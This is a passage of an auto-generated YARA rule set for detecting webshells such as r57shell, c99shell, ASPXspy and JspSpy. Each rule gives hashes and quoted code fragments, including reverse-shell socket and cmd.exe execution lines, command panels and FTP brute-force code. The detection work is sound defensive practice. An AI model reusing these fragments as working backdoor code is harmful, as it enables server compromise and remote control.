      $s14 = "n4BlHjW40mM1VtxotScrnO9lb59EluZFaTbmZZYKPHVS1xOqRDg3WozS1SeqffL8dqh/VsNDlFFsIsLDGhxn63CdWzK7GSXmeU5mo4TNPpZDx/lLqxcWLRKB3EemLBT+" ascii
      $s15 = "y8Ps4P5faRzg/qij5WZ7FJk95NxW2rIY/m8c7qPJwP2uFeoxsbpM+D9qIeO6w3weQoES2HGquVktKTidq6Wuo1m7XKWuWF5TwzKtfL8/48mwzFlcWkPIpmlsdoKpGgt9" ascii
      $s16 = "Yi0ArX625L04vnWCHfaiujU2yyyUSYUe04p9v14ry0V7v5U3Rx7A/PK1rad7aJucgwrfGgU44N501tInfG/X5iMBjs5dA43dD4WbLPnlkxui33tzVa2e8kZh5aC9UIE+" ascii
      $s17 = "0G/VixVS0Gu8NocVhts6PGulWpFlpqfi1G9qHwfjEX6PhCnJ2aJ5HfzqTI7qAeGnIpqpXPcig2LiWDYmQybWTqQp1Ltc6LGb8YJGOHRI0vtpYjuneuro7h/CHfzw9zoe" ascii
      $s18 = "YVEqctcZXZnaLVsdRaN+q5CJOdisV6cL7ujvfHelBWs8G0zE8y+VxoEWbFCL1pLUbloqTWy3QzJNGJeW1a2tci/SWbLY2yi6DaK++HmUxG3EzlWqkRSSr9oZATT8FxbT" ascii
      $s19 = "rerOTqq2LrvFS5opSL9w6l1nI4jxzE5KlZYjPaqaeH1Q7Q32txLlWIimwSCN9zqRjMRRta61hUNocZ15D0/nA3PO3yg1l5Hp5Pmzk+01kMYtk8XQ8tpuywmC6fuV1jMq" ascii
      $s20 = "ZNaRoBi18b8Im0XKa0lcSN56dudjXOaNn1fscu9WWcyY/HwXY3VCxMxOyxNBsMWs1B6bCu7itaiRMX0ZJQP1WKpdl5Jk7V6Sa4H560rtw9LMOFZDwdzufEJqg+XomCtT" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _ASPXspy2_AspxSpy2014Final_aspx_154 {
   meta:
      description = "webshell - from files ASPXspy2.aspx, AspxSpy2014Final.aspx, aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
      hash2 = "a7da83250466100782ccb95ef8e2b4c5832df8811e99b8e332594a869391dfa6"
      hash3 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
   strings:
      $s1 = "Bin_H2_Title.InnerText=\"Execute Command >>\";" fullword ascii
      $s2 = ".Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}" fullword ascii
      $s3 = "Bin_H2_Title.InnerText=\"Process >>\";" fullword ascii
      $s4 = "Response.Redirect(\"http://www.rootkit.net.cn\");" fullword ascii
      $s5 = "Bin_H2_Title.InnerText=\"RegShell >>\";" fullword ascii
      $s6 = "Bin_H2_Title.InnerText=\"IIS Spy >>\";" fullword ascii
      $s7 = "Bin_H2_Title.InnerText=\"PortScan >>\";" fullword ascii
      $s8 = "<p>File Content<br/>" fullword ascii
      $s9 = "Bin_H2_Title.InnerText=\"PortMap >>\";" fullword ascii
      $s10 = "Bin_H2_Title.InnerText=\"User Information >>\";" fullword ascii
      $s11 = "Bin_H2_Title.InnerText=\"Services >>\";" fullword ascii
      $s12 = "Bin_H2_Title.InnerText=\"System Information >>\";" fullword ascii
      $s13 = " | <span id=\"Bin_Span_Drv\" runat=\"server\"></span><a href=\"#\" id=\"Bin_Button_KillMe\" runat=\"server\" style=\"color:Red\"" ascii
      $s14 = ".head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
      $s15 = "Bin_H2_Title.InnerText=\"File Search >>\";" fullword ascii
      $s16 = "Bin_H2_Title.InnerText=\"DataBase >>\";" fullword ascii
      $s17 = "Bin_H2_Title.InnerText=\"File Manager >>\";" fullword ascii
      $s18 = " <p>CmdPath:<br/>" fullword ascii
      $s19 = "Code by Bin" fullword ascii
      $s20 = "Bin_H2_Driver.InnerText=\"Driver Information >>\";" fullword ascii
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _jsp_custom_spy_for_mysql_jsp_custom_script_for_oracle_guest_155 {
   meta:
      description = "webshell - from files jsp_custom_spy_for_mysql.jsp, jsp_custom_script_for_oracle.jsp, guest.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5602d8a781e9f917886d7f84c713554c4d485a276fdab0744790e6b260610202"
      hash2 = "995616ab61521a4d0e2414ad7fb56931f16b3a0fc13930b60ae9a1e709911d62"
      hash3 = "8db4b99711e38a16567f0cbcde2ae568b68c33324649f09fb85714f717a684cf"
   strings:
      $s1 = "        while ((n = is.read(b, 0, 512)) != -1) {" fullword ascii
      $s2 = "        HttpURLConnection h = (HttpURLConnection) u.openConnection();" fullword ascii
      $s3 = "        ServletOutputStream os = r.getOutputStream();" fullword ascii
      $s4 = "        InputStream is = h.getInputStream();" fullword ascii
      $s5 = "        f.setLastModified(dt.getTime());" fullword ascii
      $s6 = "            dt = new java.util.Date(l[i].lastModified());" fullword ascii
      $s7 = "            sb.append(l + \"\\r\\n\");" fullword ascii
      $s8 = "        java.util.Date dt;" fullword ascii
      $s9 = "        while ((l = br.readLine()) != null) {" fullword ascii
      $s10 = "        SimpleDateFormat fm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 60KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell127_r57_156 {
   meta:
      description = "webshell - from files r57shell127.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $x1 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $s2 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s3 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s4 = "@readfile (\"http://127.0.0.1/r57shell/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s5 = " echo \"<div align=center><textarea cols=65 rows=10 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW DA" ascii
      $s6 = "echo $te.\"<div align=center id='n'><textarea cols=35 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW " ascii
      $s7 = "ASES;\\nSELECT * FROM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\"; " ascii
      $s8 = "POST['cmd']!=\"ftp_brute\")){" fullword ascii
      $s9 = "ABASES;\\nSELECT * FROM user;\")).\"</textarea><br>\".in('submit','submit',0,$lang[$language.'_butt1']).\"</div></td>\".$fe.\"</" ascii
      $s10 = " if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '<div id=\"'.$id.'\" style=\"display: none;\">'; " fullword ascii
      $s11 = "echo $te.\"<div align=center id='n'><textarea cols=35 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW " ascii
      $s12 = "<title>r57shell</title>" fullword ascii
      $s13 = "if($pg_on) $select .= '<option>PostgreSQL</option>';" fullword ascii
      $s14 = " else echo \"[-] ERROR! Can't connect to PostgreSQL server\"; " fullword ascii
      $s15 = "$version = \"1.24\";" fullword ascii
      $s16 = "      echo \" | - \".$row2['TABLE_NAME'].\"\\r\\n\"; " fullword ascii
      $s17 = "echo $table_up1.$lang[$language.'_text82'].up_down('id20').$table_up2.div('id20').$ts.\"<tr>\".$fs.\"<td valign=top width=34%>\"" ascii
      $s18 = "echo $table_up1.$lang[$language.'_text82'].up_down('id20').$table_up2.div('id20').$ts.\"<tr>\".$fs.\"<td valign=top width=34%>\"" ascii
      $s19 = "$auth = 0; " fullword ascii
      $s20 = "echo \"<font face=Verdana size=-2><b><div align=center id='n'>\".$lang[$language.'_text77'].\"</div></b></font>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _angel_spy_2011_2009mssql_157 {
   meta:
      description = "webshell - from files angel.php, spy.php, 2011.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash3 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash4 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "p('<p><a href=\"http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $s2 = "p(\"<td nowrap>$name<br><span>$type($len)\".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</" ascii
      $s3 = "function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {" fullword ascii
      $s4 = "p(\"<td nowrap>$name<br><span>$type($len)\".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</" ascii
      $s5 = "function GetSFileList($dir, $content, $re = 0) {" fullword ascii
      $s6 = "if ( strstr($file, $content) || strstr( @file_get_contents($f),$content ) ) {" fullword ascii
      $s7 = "GetSFileList($f, $content, $re = 0);" fullword ascii
      $s8 = "if ( preg_match('@'.$content.'@',$file) || preg_match('@'.$content.'@', @file_get_contents($f)) ){" fullword ascii
      $s9 = "Name'].'\\', \\'structure\\');\">Structure</a> | <a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'drop\\');\">Drop</a>" ascii
      $s10 = "p('<td><a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'insert\\');\">Insert</a> | <a href=\"javascript:settable(\\''." ascii
      $s11 = "' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '').\"</span></td>\");" fullword ascii
      $s12 = "p('<td><a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'insert\\');\">Insert</a> | <a href=\"javascript:settable(\\''." ascii
      $s13 = "$findstr = $_POST['findstr'];" fullword ascii
      $s14 = "$filedata = GetSFileList($nowpath, $findstr, $re);" fullword ascii
      $s15 = "$getfield = q(\"SHOW COLUMNS FROM $tablename\");" fullword ascii
      $s16 = "$re = $_POST['re'];" fullword ascii
      $s17 = "p('<td>Operate</td>');" fullword ascii
      $s18 = "while($row = @mysql_fetch_assoc($getfield)) {" fullword ascii
      $s19 = "$keyfied = ''; //" fullword ascii
      $s20 = "if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _shell_phpspy_2005_full_2008_phpspy_2006_lnc_2009mssql_158 {
   meta:
      description = "webshell - from files shell.php, phpspy_2005_full.php, 2008.php, phpspy_2006.php, lnc.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash2 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash3 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash4 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash5 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
      hash6 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";" fullword ascii
      $s2 = "$tabledump .= \"CREATE TABLE $table (\\n\";" fullword ascii
      $s3 = "$tabledump.=\", \";" fullword ascii
      $s4 = "$tabledump = \"INSERT INTO $table VALUES(\";" fullword ascii
      $s5 = "$tabledump .= \" DEFAULT '$field[Default]'\";" fullword ascii
      $s6 = "$tabledump .= \" NOT NULL\";" fullword ascii
      $s7 = "$tabledump .= \",\\n\";" fullword ascii
      $s8 = "$tabledump .= \" $field[Extra]\";" fullword ascii
      $s9 = "$tabledump .= \");\\n\";" fullword ascii
      $s10 = "$tabledump .= \"\\n);\\n\\n\";" fullword ascii
      $s11 = "$tabledump .= \"NULL\";" fullword ascii
      $s12 = "$tabledump .= \"   KEY $kname ($colnames)\";" fullword ascii
      $s13 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";" fullword ascii
      $s14 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";" fullword ascii
      $s15 = "$tabledump .= \"   $field[Field] $field[Type]\";" fullword ascii
      $s16 = "$kname=$key['Key_name'];" fullword ascii
      $s17 = "while ($key = mysql_fetch_array($keys)) {" fullword ascii
      $s18 = "$index[$kname][] = $key['Column_name'];" fullword ascii
      $s19 = "echo $code;" fullword ascii
      $s20 = "if (!$firstfield) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99shell_c99_159 {
   meta:
      description = "webshell - from files c99shell.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash2 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $s3 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - c99shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAM" ascii
      $s4 = " Captain Crunch Security TeaM. Coded by tristram" fullword ascii
      $s5 = "*  WEB: http://ccteam.ru" fullword ascii
      $s6 = "     if (!$fp) {return \"Local error: can't write update to \".__FILE__.\"! You may download c99shell.php manually <a href=\\\"" ascii
      $s7 = "$c99sh_updateurl = \"http://ccteam.ru/update/c99shell/\"; //Update server" fullword ascii
      $s8 = "*  ICQ UIN #: 656555" fullword ascii
      $s9 = "if (!function_exists(\"posix_getpwuid\") and !in_array(\"posix_getpwuid\",$disablefunc)) {function posix_getpwuid($uid) {return " ascii
      $s10 = "function c99sh_getupdate($update = true)" fullword ascii
      $s11 = "if (!function_exists(\"posix_getgrgid\") and !in_array(\"posix_getgrgid\",$disablefunc)) {function posix_getgrgid($gid) {return " ascii
      $s12 = "if (!function_exists(\"posix_getpwuid\") and !in_array(\"posix_getpwuid\",$disablefunc)) {function posix_getpwuid($uid) {return " ascii
      $s13 = "if (!function_exists(\"posix_getgrgid\") and !in_array(\"posix_getgrgid\",$disablefunc)) {function posix_getgrgid($gid) {return " ascii
      $s14 = "if ($act == \"update\") {$ret = c99sh_getupdate(!!$confirmupdate); echo \"<b>\".$ret.\"</b>\"; if (stristr($ret,\"new version\")" ascii
      $s15 = "$filestealth = true; //if true, don't change modify- and access-time" fullword ascii
      $s16 = "$sort_save = true; //If true then save sorting-position using cookies." fullword ascii
      $s17 = " $url = $GLOBALS[\"c99sh_updateurl\"].\"?version=\".urlencode(base64_encode($GLOBALS[\"shver\"])).\"&updatenow=\".($updatenow?\"" ascii
      $s18 = "$c99sh_sourcesurl = \"http://ccteam.ru/files/c99sh_sources/\"; //Sources-server" fullword ascii
      $s19 = "  if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$string; return false;}" fullword ascii
      $s20 = "   http://ccteam.ru/releases/c99shell" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _in_warn_leo_jfolder01_JFolder_shell1_webshell_nc_jsp_400_160 {
   meta:
      description = "webshell - from files in.jsp, warn.jsp, leo.jsp, jfolder01.jsp, JFolder.jsp, shell1.jsp, webshell-nc.jsp, jsp.jsp, 400.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash2 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash3 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash4 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash5 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash6 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash7 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
      hash8 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
      hash9 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
   strings:
      $s1 = "document.frmCqq.cmd.value=cmd;" fullword ascii
      $s2 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword ascii
      $s3 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword ascii
      $s4 = "System.out.println(e.toString());" fullword ascii
      $s5 = "String path = (String) ht.get(\"path\");" fullword ascii
      $s6 = "document.frmCqq.content.value=content;" fullword ascii
      $s7 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword ascii
      $s8 = "sb.append(p.charAt(i));" fullword ascii
      $s9 = "bw.write(strContent);" fullword ascii
      $s10 = "response.setContentType(\"APPLICATION/OCTET-STREAM\");" fullword ascii
      $s11 = "document.frmCqq.action.value=action;" fullword ascii
      $s12 = "document.frmCqq.tabID.value=tab;" fullword ascii
      $s13 = "fileInputStream.close();" fullword ascii
      $s14 = "sbEdit.append(\"</form>\");" fullword ascii
      $s15 = "out.println(sbDown.toString());" fullword ascii
      $s16 = "document.frmCqq.path.value=path;" fullword ascii
      $s17 = "out.println(sbSaveCopy.toString());" fullword ascii
      $s18 = "strUnit = \"MB\";" fullword ascii
      $s19 = "sbFile.append(\"</td><td>\");" fullword ascii
      $s20 = "in1.close();" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _jspbd_jsp_reverse_161 {
   meta:
      description = "webshell - from files jspbd.jsp, jsp-reverse.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "702fb236f525c348fcb3f95053b20a2df946db38e4d2b007a6314606c8f5cc46"
      hash2 = "edd2ea0252d53d4ef62d593c60e589f1710153f126cfead7523a7f99e7fa1a78"
   strings:
      $x1 = "                Process proc = rt.exec(\"cmd.exe\");" fullword ascii
      $s2 = "<h1>JSP Backdoor Reverse Shell</h1>" fullword ascii
      $s3 = "String ipPort = request.getParameter(\"port\");" fullword ascii
      $s4 = "String ipAddress = request.getParameter(\"ipaddress\");" fullword ascii
      $s5 = "// backdoor.jsp" fullword ascii
      $s6 = "if(ipAddress != null && ipPort != null)" fullword ascii
      $s7 = "page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"" fullword ascii
      $s8 = "                Runtime rt = Runtime.getRuntime();" fullword ascii
      $s9 = "<input type=\"text\" name=\"port\" size=10>" fullword ascii
      $s10 = "<input type=\"text\" name=\"ipaddress\" size=30>" fullword ascii
      $s11 = "        public void run()" fullword ascii
      $s12 = "                        new StreamConnector(proc.getInputStream()," fullword ascii
      $s13 = "                                          proc.getOutputStream());" fullword ascii
      $s14 = "                                          sock.getOutputStream());" fullword ascii
      $s15 = "<input type=\"submit\" name=\"Connect\" value=\"Connect\">" fullword ascii
      $s16 = "                        new StreamConnector(sock.getInputStream()," fullword ascii
      $s17 = "static class StreamConnector extends Thread" fullword ascii
      $s18 = "                BufferedReader isr = null;" fullword ascii
      $s19 = "                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword ascii
      $s20 = "                        isr = new BufferedReader(new InputStreamReader(is));" fullword ascii
   condition:
      ( uint16(0) == 0x2f2f and filesize < 7KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1d_mumaasp_com_162 {
   meta:
      description = "webshell - from files 1d.asp, mumaasp.com.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5a1a2900ec634bb1651fff9d542491221449754289ad5a58791ee3104ccef752"
      hash2 = "a127dfa17e403f954441ae42d4bca8d2bdbc2e566e522a2ea75d88722540efae"
   strings:
      $s1 = "/aGxk+ hMkOnr@!k" fullword ascii
      $s2 = "@!&l@*@!JY[@*@!&YM@*E@#@&IIjE@!Y.@*@!O9P4" fullword ascii
      $s3 = "0{BgzmDrW" fullword ascii
      $s4 = "@*r@#@&\"IUE@!KwOkKx~-mVE" fullword ascii
      $s5 = "/ED+PUrU0K2" fullword ascii
      $s6 = "lZMDc-+" fullword ascii
      $s7 = "DcJr/=-wGW1E:" fullword ascii
      $s8 = "@!&WaObWU@*J@#@&I\"?r@!WaYrW" fullword ascii
      $s9 = "dwKxd+c" fullword ascii
      $s10 = "RADbO+r@!2~mVkLU{B^+" fullword ascii
      $s11 = "D7nDcZ.+mYn6(L+1O`r?mMr2YbxTRoksnUXdY" fullword ascii
      $s12 = "W'ELl7CdmMkaYls;s^sGDscJrJ']" fullword ascii
      $s13 = "@!Jl@*@!&ON@*@!JY.@*E@#@&I]?r@!YM@*@!O9PtnrTtO'E+8B@*@!l,tD" fullword ascii
      $s14 = "O'Esk^noDm:" fullword ascii
      $s15 = "@!Jl@*@!&DN@*@!JOM@*E@#@&\"I?r@!D.@*@!Y[P4+rL4Y'E+FE@*@!m~4D" fullword ascii
      $s16 = "C^En'bGx,\\@*@!KwY2ObWU" fullword ascii
      $s17 = "@!mP4." fullword ascii
      $s18 = "cJwWs[" fullword ascii
      $s19 = "J@!KwDkW" fullword ascii
      $s20 = "ko4Y{v 8B@*@!mP4." fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _t00ls1_t00ls_163 {
   meta:
      description = "webshell - from files t00ls1.jsp, t00ls.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash2 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
   strings:
      $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
      $x2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
      $s3 = "t.getHeader(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!" ascii
      $s4 = "  ((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword ascii
      $s5 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
      $s6 = "clipboardData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText" ascii
      $s7 = " File tempF = new File(savePath);" fullword ascii
      $s8 = " if (tempF.isDirectory()) {" fullword ascii
      $s9 = " File saveF = tempF;" fullword ascii
      $s10 = "oString()+\"/exportdata.txt\")+\"\\\" size=\\\"100\\\" class=\\\"input\\\"/> <input type=\\\"submit\\\" class=\\\"bt\\\" value=" ascii
      $s11 = " String downFileUrl = request.getParameter(\"url\");" fullword ascii
      $s12 = "byte[] b = v.getBytes();" fullword ascii
      $s13 = " String savePath = request.getParameter(\"savepath\");" fullword ascii
      $s14 = " BufferedInputStream in = new BufferedInputStream(conn.getInputStream());" fullword ascii
      $s15 = "byte[] b = colName.getBytes();" fullword ascii
      $s16 = "  while (len != -1) {" fullword ascii
      $s17 = "  JSession.setAttribute(\"done\",\"d\");" fullword ascii
      $s18 = "  int len = in.read(data);" fullword ascii
      $s19 = " URLConnection conn = downUrl.openConnection();" fullword ascii
      $s20 = " //zip root directory" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_D_____ASP__wt_asp__1__vps_164 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, D -  [ASP].asp, wt.asp, asp (1).asp, vps.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "2838b2bff6e6a4908447291924eabd30eab582b14bb3ac2ac5f3f97851f33cfc"
      hash4 = "b3d59d237cf654294c4be9c4887da8c43c5ad0bef70deeea9aa424f890135cb7"
      hash5 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash6 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
   strings:
      $s1 = "Paths_str=\"c:\\windows\\\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\\"&chr(13)&chr(10)&\"c:\\Program Files\\\"" fullword ascii
      $s2 = "Response.Write \"<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' checked='checked' />\"" fullword ascii
      $s3 = "Response.Write \"<label for='NoCheckTemp'>\"" fullword ascii
      $s4 = "Response.Write \"<form id='form1' name='form1' method='post' action=''>\"" fullword ascii
      $s5 = "if (CheckNextDir=True) and (IS_TEMP_DIR=false) then '" fullword ascii
      $s6 = "  IS_TEMP_DIR =" fullword ascii
      $s7 = "if Right(path,1) <> \"\\\" then GetFullPath = path&\"\\\" '" fullword ascii
      $s8 = "Path = GetFullPath(Path) '" fullword ascii
      $s9 = "Response.Write \"</label>\"" fullword ascii
      $s10 = "Response.Write \"<input type='submit' name='button' value='" fullword ascii
      $s11 = "Response.Write \"[<font color=red>" fullword ascii
      $s12 = "Response.Write \"<input name='CheckNextDir' type='checkbox' id='CheckNextDir' checked='checked' />" fullword ascii
      $s13 = "Response.Write \"<input name='ShowNoWrite' type='checkbox' id='ShowNoWrite'/>\"" fullword ascii
      $s14 = "Response.Write \"<label for='ShowNoWrite'>\"" fullword ascii
      $s15 = "Response.Write \"[<font color=#0066FF>" fullword ascii
      $s16 = "(instr(UCase(Path),\"WINDOWS\\TEMP\")>0) and NoCheckTemp" fullword ascii
      $s17 = "Response.Write \"<label for='CheckNextDir'>\"" fullword ascii
      $s18 = "Response.Write \"<label for='CheckFile'>\"" fullword ascii
      $s19 = "Response.Write \"<br />\"" fullword ascii
      $s20 = "Response.Write \"[" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x483c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897_2014_4_0__1___2013____1__165 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, 2014.asp, 4.0 (1).asp, .asp, 2013.asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash6 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash7 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
